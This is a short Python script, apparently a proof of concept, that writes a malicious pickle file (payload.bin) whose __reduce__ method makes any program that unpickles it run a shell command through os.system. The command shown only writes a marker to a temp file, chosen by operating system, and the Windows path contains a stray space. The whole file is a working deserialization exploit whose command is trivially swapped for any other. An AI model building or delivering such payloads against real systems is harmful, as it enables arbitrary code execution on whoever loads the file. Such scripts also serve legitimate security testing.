# exploit-make.py

import pickle
import os
import platform


# this object executes code on unpickling. using the legace RCE pattern via os.system call.
class Evil(object):
    def __reduce__(self):
        #choose a path depending on OS of the target 
        if platform.system() == "Windows":
            cmd = r'echo EXPLOIT_RAN > C :\\tmp\\exploit.txt'
        else:
            cmd = 'echo EXPLOIT_RAN > /tmp/exploit.txt'
        return (os.system, (cmd,))
payload = pickle.dumps(Evil())

with open("payload.bin", "wb") as f:
    f.write(payload)
print("payload.bin written")